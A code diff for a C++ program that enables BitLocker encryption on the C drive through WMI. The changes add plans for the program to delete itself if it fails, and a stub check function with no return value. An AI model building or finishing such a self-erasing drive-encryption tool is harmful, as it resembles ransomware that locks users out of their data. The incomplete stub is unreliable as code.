@@ -9,13 +9,15 @@
     ProtectKeyWithTPM (probably not though)
     
 The other limitation is that this code requires bitlocker to be enabled and configured.
-Im looking into a VBscript that can check if this is the case and delete the entire application if not
+Im looking into a Python that can check if this is the case and delete itself if not enabled, 
+or attempt to enable it and continue.
 :).
 
 */
 #include <iostream>
 #include <windows.h>
 #include <wbemidl.h>
+#include <cstdio> // to remove application if it fails
 #pragma comment(lib, "wbemuuid.lib")
 
 void EncryptDrive(const std::wstring& driveLetter) {
@@ -159,7 +161,12 @@ void EncryptDrive(const std::wstring& driveLetter) {
     pLoc->Release();
     CoUninitialize();
 }
-
+// check if bitlocker is enabled
+bool IsBitlockerEnabled(const std::wstring& driveLetter) {
+    HRESULT hres;
+    bool isEnabled = false;
+}
+// main function
 int main() {
     std::wstring drive = L"C"; // Specify the drive to encrypt (e.g., C)
     EncryptDrive(drive);
